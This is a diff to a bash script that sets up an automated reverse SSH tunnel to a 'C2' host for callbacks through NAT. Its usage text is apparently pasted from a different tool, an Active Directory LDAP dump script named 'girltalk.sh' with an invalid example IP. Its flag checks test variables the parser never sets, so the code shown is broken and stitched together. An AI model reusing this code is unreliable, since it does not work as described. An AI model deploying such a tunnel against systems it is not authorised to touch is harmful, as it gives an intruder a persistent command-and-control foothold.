@@ -1,5 +1,87 @@
 #!/bin/bash
 
+################################################################
+#                                                              #
+# Let's setup an automated reverse ssh device!                 #
+#                                                              #
+#                                                              #
+# xoxo Hexadecim8 did this xoxo                                #
+#                                                              #
+################################################################
+
+
+USAGE="
+A bash script to automate reverse a reverse ssh tunnel. Handy for callbacks
+through NAT.
+Flags:
+  -a	Specify AWS C2 infrastructure.
+  -k    SSH key.
+  -n    Password based C2 access.
+  -c    C2 host <ip address or routable hostname>.
+  -u	C2 username.
+  -l    Local username to use.
+  -h	Help text and usage example.
+usage:	 girltalk.sh -d <domain> -u <username> -p <password> -c <domain controller> -o <outputFileName.ldif>
+example: girltalk.sh -d GIBSON -u zerocool -p hunter2 -c 10.10.10.257 -o gibsonAD.ldif
+"
+
+# Check if any flags were set. If not, print out help.
+if [ $# -eq 0 ]; then
+	echo "$USAGE"
+	exit
+fi
+
+# Set flags.
+while getopts "a:k:n:c::u:l:h" FLAG
+do
+	case $FLAG in
+		a)
+			AWS=$OPTARG
+			;;
+		k)
+			KEY=$OPTARG
+			;;
+		n)
+			NONAWS=$OPTARG
+			;;
+		c)
+			HOST=$OPTARG
+			;;
+		u)
+			USERNAME=$OPTARG
+			;;
+		l)
+			LOCAL=$OPTARG
+			;;
+		h)	echo "$USAGE"
+			exit
+			;;
+		*)
+			echo "$USAGE"
+			exit
+			;;
+	esac
+done
+
+# Make sure each required flag was actually set.
+if [ -z ${USERNAME+x} ]; then
+	echo "Username flag (-u) is not set."
+	echo "$USAGE"
+	exit
+elif [ -z ${PASSWORD+x} ]; then
+	echo "Password flag (-p) is not set."
+	echo "$USAGE"
+	exit
+elif [ -z ${DOMAIN+x} ]; then
+	echo "User domain flag (-f) is not set."
+	echo "$USAGE"
+	exit
+elif [ -z ${DCIP+x} ]; then
+	echo "Domain Controller IP flag (-c) is not set."
+	echo "$USAGE"
+	exit
+fi
+
 #Check for connectivity
 echo "### Checking For Internet ###"
 if ping -q -c 1 -W 1 1.1.1.1 >/dev/null; then
